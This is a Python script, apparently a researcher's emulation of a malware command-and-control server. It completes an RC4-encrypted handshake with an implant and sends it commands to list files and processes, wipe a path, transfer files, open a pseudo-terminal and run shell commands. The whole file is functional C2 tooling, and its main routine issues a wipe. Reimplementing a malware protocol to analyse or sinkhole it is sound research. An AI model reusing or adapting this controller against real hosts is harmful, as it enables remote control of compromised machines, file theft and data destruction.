import socket
from Crypto.Cipher import ARC4
import binascii

global key
key = binascii.unhexlify('D9F936CE628C3E5D9B3695694D1CDE79E470E938064D98FBF4EF980A5558D1C90C7E650C2362A21B914ABD173ABA5C0E5837C47B89F74C5B23A7294CC1CFD11B')

def rc4_encrypt(data):
    global key
    cipher = ARC4.new(key)
    return cipher.encrypt(data)


rc4_decrypt = rc4_encrypt


def handshake_old_version(client_socket):
    # Receive random
    print('random', client_socket.recv(4))
    # Send C2 nonce, any value as we are not doing the calculation
    c2_nonce = b'\x62\x2E\x00\x00'
    client_socket.send(rc4_encrypt(c2_nonce))
    # Receive Challenge
    print('challenge: ', client_socket.recv(4))
    # Send C2 validation
    dword_validate = b'\x72\x33\x1C\x04'
    client_socket.send(rc4_encrypt(dword_validate))
    # Receive ID
    ID = rc4_decrypt(client_socket.recv(0x18))
    print(ID)
    print('received ID: {}'.format(ID.split(b'\x00\x00')[0].decode('utf-8')))


def handshake(client_socket):
    global key
    # Receive random
    client_socket.recv(0x14)
    randoms = client_socket.recv(0x400)
    key_index = 87
    key_size = 64
    key = randoms[key_index:key_index+key_size]
    check_sequence_index = 336
    check_sequence_size = 0x100
    check = randoms[check_sequence_index:check_sequence_index+check_sequence_size]
    client_socket.send(rc4_encrypt(b'\x00'*0x10 + int.to_bytes(0x100, 4, "little")))
    client_socket.send(rc4_encrypt(check))

    client_socket.recv(0x14)
    client_socket.recv(0x50)


def send_payload(client_socket, payload):
    # Send payload size
    client_socket.send(rc4_encrypt(int.to_bytes(len(payload), 4, 'little')))
    # Send payload
    client_socket.send(rc4_encrypt(payload))


def setup_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = ('0.0.0.0', 12346)
    sock.bind(server_address)
    sock.listen(1)
    client_socket, client_addr = sock.accept()
    return sock, client_socket


def receive_data(client_socket):
    received_data = rc4_encrypt(client_socket.recv(0x14))
    receive_size = int.from_bytes(received_data[16:16+4], "little")
    print(f"receive_size: {receive_size}")
    recv_data = rc4_encrypt(client_socket.recv(receive_size))
    print(recv_data.decode('utf-8'))
    return recv_data


def send_command(client_socket, data, command_id):
    data_size = len(data)
    client_socket.send(rc4_encrypt(int.to_bytes(command_id, 1 , "little") + b'\x00'*0x0F + int.to_bytes(data_size, 4, "little")))
    client_socket.send(rc4_encrypt(data))


def get_files(client_socket):
    send_command(client_socket, b"/", 0xD3) 
    data = receive_data(client_socket,)
    i = 0
    print(data)
    while i < len(data):
        filename_size = int.from_bytes(data[i + 0x34: i + 0x34 + 4], "little")
        stats = data[i + 0x8:i + 0x13].decode('utf-8')
        filename = data[i+0x38 : i+0x38 + filename_size].decode('utf-16LE')
        print(f'{stats} \t {filename}')
        i = i + 0x38 + filename_size


def get_processes(client_socket):
    send_command(client_socket, b"", 0xD9) 
    data = receive_data(client_socket,)
    i = 0
    #print(data)
    while i < len(data):
        filename_size = int.from_bytes(data[i + 0x20: i + 0x20 + 4], "little")
        
        if filename_size > 0xFF:
            continue
        print(filename_size)
        process_name = data[i+0x24 : i+0x24 + filename_size].decode('utf-16LE')
        print(f'{process_name}')
        i = i + 0x20 + filename_size


def wipe(client_socket):
    send_command(client_socket, "/tmp/test".encode('utf-16LE'), 0xD8)


def download_file(client_socket):
    send_command(client_socket, b'\x00'*0x08 + "/tmp/test".encode('utf-16LE'), 0xD6)
    size = receive_data(client_socket,)
    file_content = receive_data(client_socket,)
    print("file_content: ", file_content)


def upload_file(client_socket):
    send_command(client_socket, b'\x00'*0x08 + "/tmp/test".encode('utf-16LE'), 0xD5)
    send_command(client_socket, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".encode('utf-16LE'), 0xD5)


def create_pty(client_socket):
    send_command(client_socket, b'\x00'*0x08, 0xDD)


def send_cmd(client_socket):
    send_command(client_socket, "\nwhoami\n\x00".encode('utf-16LE'), 0xDB)


def recv_cmd(client_socket):
    send_command(client_socket, b'\x00'*0x08, 0xDC)
    print(receive_data(client_socket,))


def main():
    _, client_socket = setup_server()
    handshake(client_socket)
    receive_data(client_socket,)
    wipe(client_socket)

main()